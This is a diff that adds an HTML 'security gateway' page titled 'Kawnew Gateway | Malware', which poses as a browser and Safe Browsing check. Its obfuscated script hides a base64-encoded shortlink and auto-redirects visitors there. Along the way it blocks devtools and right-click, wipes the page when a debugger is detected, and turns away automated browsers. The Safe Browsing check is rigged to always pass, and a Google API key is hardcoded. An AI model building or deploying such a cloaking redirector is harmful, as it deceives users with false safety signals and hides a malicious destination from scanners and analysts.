@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <title>Kawnew Gateway | Malware</title>
+  <style>
+    :root {
+      --bg-color: #0b1120;
+      --card-bg: rgba(30, 41, 59, 0.75);
+      --accent: #3b82f6;
+      --success: #10b981;
+      --error: #ef4444;
+      --text: #f8fafc;
+      --subtext: #94a3b8;
+    }
+
+    * { box-sizing: border-box; user-select: none; }
+    
+    body {
+      margin: 0;
+      height: 100vh;
+      background-color: var(--bg-color);
+      color: var(--text);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+    }
+
+    #bg-canvas {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      z-index: 0;
+      opacity: 0.25;
+    }
+
+    .card {
+      position: relative;
+      z-index: 10;
+      width: 100%;
+      max-width: 450px;
+      padding: 30px;
+      background: var(--card-bg);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 16px;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.6);
+      text-align: center;
+    }
+
+    .loader {
+      width: 60px; height: 60px;
+      margin: 0 auto 20px;
+      border: 4px solid rgba(59, 130, 246, 0.2);
+      border-top-color: var(--accent);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    .status-icon {
+      font-size: 48px;
+      margin-bottom: 15px;
+      display: none;
+    }
+
+    h1 { margin: 0 0 10px; font-size: 24px; font-weight: 700; letter-spacing: -0.5px; }
+    p { margin: 0 0 25px; color: var(--subtext); font-size: 14px; line-height: 1.5; }
+
+    .check-list {
+      text-align: left;
+      background: rgba(0, 0, 0, 0.3);
+      padding: 15px;
+      border-radius: 10px;
+      margin-bottom: 20px;
+      border: 1px solid rgba(255, 255, 255, 0.05);
+    }
+    .check-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 10px;
+      font-size: 13px;
+      color: var(--subtext);
+    }
+    .check-item:last-child { margin-bottom: 0; }
+    
+    .status-pill {
+      font-weight: 600;
+      font-size: 12px;
+      padding: 2px 8px;
+      border-radius: 4px;
+      background: rgba(255,255,255,0.05);
+      min-width: 60px;
+      text-align: center;
+    }
+    .pending { color: #facc15; }
+    .success { color: var(--success); background: rgba(16, 185, 129, 0.1); }
+    .failed { color: var(--error); background: rgba(239, 68, 68, 0.1); }
+
+    .btn-action {
+      background: var(--accent);
+      color: white;
+      border: none;
+      width: 100%;
+      padding: 14px;
+      border-radius: 8px;
+      font-weight: 600;
+      font-size: 15px;
+      cursor: pointer;
+      transition: all 0.2s;
+      display: none; /* ซ่อนก่อน */
+    }
+    .btn-action:hover { background: #2563eb; transform: translateY(-1px); }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 11px;
+      color: #475569;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+
+  <canvas id="bg-canvas"></canvas>
+
+  <div class="card">
+    <div id="loading-spinner" class="loader"></div>
+    <div id="icon-ok" class="status-icon" style="color: var(--success);"></div>
+    <div id="icon-fail" class="status-icon" style="color: var(--error);">✕</div>
+
+    <h1 id="title">Verifying Request...</h1>
+    <p id="desc">Analyzing your browser environment and connection security.</p>
+
+    <div class="check-list">
+      <div class="check-item">
+        <span>PoW Anti-DDoS</span>
+        <span id="st-pow" class="status-pill pending">Pending</span>
+      </div>
+      <div class="check-item">
+        <span>Browser Integrity</span>
+        <span id="st-int" class="status-pill pending">Pending</span>
+      </div>
+      <div class="check-item">
+        <span>Safe Browsing (API)</span>
+        <span id="st-api" class="status-pill pending">Pending</span>
+      </div>
+    </div>
+
+    <button id="btn-go" class="btn-action" onclick="forceRedirect()">Proceed Now</button>
+    <div id="timer-text" style="margin-top:10px; font-size:12px; color:var(--subtext); min-height:18px;"></div>
+
+    <div class="footer">
+      Secured by Kawnew • ID: <span id="req-id"></span>
+    </div>
+  </div>
+
+  <script>
+    const _0x456158=_0x5bd9;function _0x1abc(){const _0x5abd53=['aHR0cHM6Ly90aW55dXJsLmNvbS9tcmVkcDUzOA==','height','status-pill\x20','getContext','64xIpfPE','width','fillStyle','Bot\x20Detected','contextmenu','beginPath','Unsafe\x20URL','json','color','Computation\x20Check\x20Failed','random','lineTo','POST','preventDefault','keys','fill','toUpperCase','Auto-redirecting\x20in\x20','innerHTML','PoW\x20Failed','keyCode','Access\x20Denied','draw','1.0','warn','innerHeight','display','Automated\x20Traffic\x20Detected','loading-spinner','Redirecting\x20you\x20to\x20the\x20destination...','icon-fail','stroke','push','arc','No\x20API\x20Key\x20provided,\x20skipping\x20check\x20(Allow\x20Default).','URL','failed','<h1>Access\x20Denied:\x20Debugger\x20Detected</h1>','now','update','AIzaSyCQVIi9754xXmTNn__mJTlGiy-0xtxSZrM','substring','body','shiftKey','MALWARE','security-gate','Pass','2794000LSmpky','outerWidth','clearRect','sqrt','btn-go','toString','webdriver','bg-canvas','\x20seconds...','stringify','targetDest','timer-text','#3b82f6','st-api','1224873hdOPyd','block','location','4uUyQIT','1753326QmmXCi','Verified','1338378Cexakd','API\x20Check\x20Error\x20(CORS/Network):','resize','desc','rgba(59,\x20130,\x20246,\x20','ctrlKey','st-int','st-pow','className','textContent','var(--error)','innerWidth','none','1545549SFKWLC','getElementById','Clean','Debugger\x20Detected','replace','strokeStyle','success','application/json','log','ANY_PLATFORM','onload','addEventListener','title','style','icon-ok','keydown','Destination\x20URL\x20is\x20flagged\x20as\x20dangerous','SOCIAL_ENGINEERING','outerHeight','Connection\x20Verified','21GBGCov','5586410KTvkeC','size','length','moveTo','https://safebrowsing.googleapis.com/v4/threatMatches:find?key=','293516cevUBK','req-id','userAgent'];_0x1abc=function(){return _0x5abd53;};return _0x1abc();}(function(_0x2d05a1,_0x932384){const _0x5e56b6=_0x5bd9,_0x16dfab=_0x2d05a1();while(!![]){try{const _0x1d231e=parseInt(_0x5e56b6(0x14f))/0x1+-parseInt(_0x5e56b6(0x169))/0x2+parseInt(_0x5e56b6(0x13c))/0x3+-parseInt(_0x5e56b6(0x13f))/0x4*(parseInt(_0x5e56b6(0x12e))/0x5)+parseInt(_0x5e56b6(0x142))/0x6*(parseInt(_0x5e56b6(0x163))/0x7)+-parseInt(_0x5e56b6(0x170))/0x8*(parseInt(_0x5e56b6(0x140))/0x9)+parseInt(_0x5e56b6(0x164))/0xa;if(_0x1d231e===_0x932384)break;else _0x16dfab['push'](_0x16dfab['shift']());}catch(_0x56db3e){_0x16dfab['push'](_0x16dfab['shift']());}}}(_0x1abc,0xe0060));const TARGET_B64=_0x456158(0x16c),GOOGLE_API_KEY=_0x456158(0x127),$=_0x409243=>document[_0x456158(0x150)](_0x409243),setStatus=(_0x5491af,_0xe6a202,_0x172eac)=>{const _0x350130=_0x456158,_0x1c1662=$(_0x5491af);_0x1c1662[_0x350130(0x14b)]=_0x172eac,_0x1c1662[_0x350130(0x14a)]=_0x350130(0x16e)+_0xe6a202;},sleep=_0x74a905=>new Promise(_0x4bc81e=>setTimeout(_0x4bc81e,_0x74a905));$(_0x456158(0x16a))[_0x456158(0x14b)]=Math[_0x456158(0x109)]()[_0x456158(0x133)](0x24)[_0x456158(0x128)](0x2,0xa)[_0x456158(0x10f)](),(function(){const _0x594002=_0x456158;document[_0x594002(0x15a)](_0x594002(0x174),_0x5ab5d0=>_0x5ab5d0[_0x594002(0x10c)]()),document[_0x594002(0x15a)](_0x594002(0x15e),_0x151327=>{const _0x8fcce3=_0x594002;if(_0x151327[_0x8fcce3(0x113)]==0x7b||_0x151327[_0x8fcce3(0x147)]&&_0x151327[_0x8fcce3(0x12a)]&&_0x151327[_0x8fcce3(0x113)]==0x49||_0x151327[_0x8fcce3(0x147)]&&_0x151327[_0x8fcce3(0x113)]==0x55)return![];}),setInterval(()=>{const _0x59ca91=_0x594002,_0x467226=performance[_0x59ca91(0x125)]();debugger;if(performance[_0x59ca91(0x125)]()-_0x467226>0x64){document[_0x59ca91(0x129)][_0x59ca91(0x111)]=_0x59ca91(0x124);throw new Error(_0x59ca91(0x152));}},0x3e8);}());async function runPoW(){const _0x51d8a3=_0x456158,_0x48ef0d=performance[_0x51d8a3(0x125)]();let _0x98da63=0x0;for(let _0xb45edf=0x0;_0xb45edf<0x2dc6c0;_0xb45edf++){_0x98da63=(_0x98da63<<0x5)-_0x98da63+_0xb45edf,_0x98da63|=0x0;}const _0x3d7e1d=performance[_0x51d8a3(0x125)]();if(_0x3d7e1d-_0x48ef0d<0x5)return![];return!![];}function checkIntegrity(){const _0x326413=_0x456158;if(navigator[_0x326413(0x134)])return![];if(window[_0x326413(0x12f)]===0x0||window[_0x326413(0x161)]===0x0)return![];if(!navigator[_0x326413(0x16b)]||navigator[_0x326413(0x16b)][_0x326413(0x166)]<0x14)return![];return!![];}async function checkSafeBrowsing(_0xccf29){const _0x2e2aa9=_0x456158;if(GOOGLE_API_KEY===_0x2e2aa9(0x127))return console[_0x2e2aa9(0x157)](_0x2e2aa9(0x121)),!![];const _0x23825c=_0x2e2aa9(0x168)+GOOGLE_API_KEY,_0x426a5a={'client':{'clientId':_0x2e2aa9(0x12c),'clientVersion':_0x2e2aa9(0x116)},'threatInfo':{'threatTypes':[_0x2e2aa9(0x12b),_0x2e2aa9(0x160)],'platformTypes':[_0x2e2aa9(0x158)],'threatEntryTypes':[_0x2e2aa9(0x122)],'threatEntries':[{'url':_0xccf29}]}};try{const _0x13b86e=await fetch(_0x23825c,{'method':_0x2e2aa9(0x10b),'headers':{'Content-Type':_0x2e2aa9(0x156)},'body':JSON[_0x2e2aa9(0x137)](_0x426a5a)}),_0x4e0b1e=await _0x13b86e[_0x2e2aa9(0x177)]();return Object[_0x2e2aa9(0x10d)](_0x4e0b1e)[_0x2e2aa9(0x166)]===0x0;}catch(_0x2125ea){return console[_0x2e2aa9(0x117)](_0x2e2aa9(0x143),_0x2125ea),!![];}}async function startVerification(){const _0x201788=_0x456158,_0xa49dc1=atob(TARGET_B64);await sleep(0x1f4);try{const _0x160739=await runPoW();if(_0x160739)setStatus(_0x201788(0x149),_0x201788(0x155),_0x201788(0x141));else throw new Error(_0x201788(0x112));}catch(_0x29baad){fail(_0x201788(0x179));return;}await sleep(0x320);if(checkIntegrity())setStatus(_0x201788(0x148),_0x201788(0x155),_0x201788(0x12d));else{setStatus(_0x201788(0x148),_0x201788(0x123),_0x201788(0x173)),fail(_0x201788(0x11a));return;}await sleep(0x258);const _0x163795=await checkSafeBrowsing(_0xa49dc1);if(_0x163795)setStatus(_0x201788(0x13b),_0x201788(0x155),_0x201788(0x151));else{setStatus(_0x201788(0x13b),_0x201788(0x123),_0x201788(0x176)),fail(_0x201788(0x15f));return;}success(_0xa49dc1);}function fail(_0x5f0e17){const _0x215034=_0x456158;$(_0x215034(0x11b))[_0x215034(0x15c)][_0x215034(0x119)]=_0x215034(0x14e),$(_0x215034(0x11d))[_0x215034(0x15c)][_0x215034(0x119)]=_0x215034(0x13d),$(_0x215034(0x15b))[_0x215034(0x14b)]=_0x215034(0x114),$(_0x215034(0x15b))[_0x215034(0x15c)][_0x215034(0x178)]=_0x215034(0x14c),$(_0x215034(0x145))[_0x215034(0x14b)]=_0x5f0e17;}function success(_0x1a7fd5){const _0x7bba46=_0x456158;$(_0x7bba46(0x11b))[_0x7bba46(0x15c)][_0x7bba46(0x119)]=_0x7bba46(0x14e),$(_0x7bba46(0x15d))[_0x7bba46(0x15c)][_0x7bba46(0x119)]=_0x7bba46(0x13d),$(_0x7bba46(0x15b))[_0x7bba46(0x14b)]=_0x7bba46(0x162),$(_0x7bba46(0x145))[_0x7bba46(0x14b)]=_0x7bba46(0x11c),$(_0x7bba46(0x132))[_0x7bba46(0x15c)][_0x7bba46(0x119)]=_0x7bba46(0x13d);let _0x39c9f1=0x5;const _0x1c732f=$(_0x7bba46(0x139)),_0x1c0374=setInterval(()=>{const _0x2c0ef4=_0x7bba46;_0x39c9f1--,_0x1c732f[_0x2c0ef4(0x14b)]=_0x2c0ef4(0x110)+_0x39c9f1+_0x2c0ef4(0x136),_0x39c9f1<=0x0&&(clearInterval(_0x1c0374),window[_0x2c0ef4(0x13e)][_0x2c0ef4(0x153)](_0x1a7fd5));},0x3e8);window[_0x7bba46(0x138)]=_0x1a7fd5;}function forceRedirect(){const _0x513a3e=_0x456158;if(window[_0x513a3e(0x138)])window[_0x513a3e(0x13e)][_0x513a3e(0x153)](window[_0x513a3e(0x138)]);}window[_0x456158(0x159)]=startVerification;function _0x5bd9(_0x496597,_0x57963c){_0x496597=_0x496597-0x109;const _0x1abcd6=_0x1abc();let _0x5bd992=_0x1abcd6[_0x496597];return _0x5bd992;}const canvas=$(_0x456158(0x135)),ctx=canvas[_0x456158(0x16f)]('2d');let width,height,particles=[];function resize(){const _0x2c9637=_0x456158;width=canvas[_0x2c9637(0x171)]=window[_0x2c9637(0x14d)],height=canvas[_0x2c9637(0x16d)]=window[_0x2c9637(0x118)];}window[_0x456158(0x15a)](_0x456158(0x144),resize),resize();class Particle{constructor(){const _0x16950f=_0x456158;this['x']=Math[_0x16950f(0x109)]()*width,this['y']=Math[_0x16950f(0x109)]()*height,this['vx']=(Math[_0x16950f(0x109)]()-0.5)*0.5,this['vy']=(Math[_0x16950f(0x109)]()-0.5)*0.5,this[_0x16950f(0x165)]=Math[_0x16950f(0x109)]()*0x2+0x1;}[_0x456158(0x126)](){this['x']+=this['vx'],this['y']+=this['vy'];if(this['x']<0x0||this['x']>width)this['vx']*=-0x1;if(this['y']<0x0||this['y']>height)this['vy']*=-0x1;}[_0x456158(0x115)](){const _0x4c2958=_0x456158;ctx[_0x4c2958(0x172)]=_0x4c2958(0x13a),ctx[_0x4c2958(0x175)](),ctx[_0x4c2958(0x120)](this['x'],this['y'],this[_0x4c2958(0x165)],0x0,Math['PI']*0x2),ctx[_0x4c2958(0x10e)]();}}for(let i=0x0;i<0x32;i++)particles[_0x456158(0x11f)](new Particle());function animate(){const _0x1b1605=_0x456158;ctx[_0x1b1605(0x130)](0x0,0x0,width,height);for(let _0x4617ca=0x0;_0x4617ca<particles[_0x1b1605(0x166)];_0x4617ca++){particles[_0x4617ca][_0x1b1605(0x126)](),particles[_0x4617ca][_0x1b1605(0x115)]();for(let _0x3231dc=_0x4617ca;_0x3231dc<particles[_0x1b1605(0x166)];_0x3231dc++){const _0x24048b=particles[_0x4617ca]['x']-particles[_0x3231dc]['x'],_0x4b904e=particles[_0x4617ca]['y']-particles[_0x3231dc]['y'],_0x1d1558=Math[_0x1b1605(0x131)](_0x24048b*_0x24048b+_0x4b904e*_0x4b904e);_0x1d1558<0x64&&(ctx[_0x1b1605(0x154)]=_0x1b1605(0x146)+(0x1-_0x1d1558/0x64)+')',ctx[_0x1b1605(0x175)](),ctx[_0x1b1605(0x167)](particles[_0x4617ca]['x'],particles[_0x4617ca]['y']),ctx[_0x1b1605(0x10a)](particles[_0x3231dc]['x'],particles[_0x3231dc]['y']),ctx[_0x1b1605(0x11e)]());}}requestAnimationFrame(animate);}animate();
+
+  </script>
+</body>
+</html>
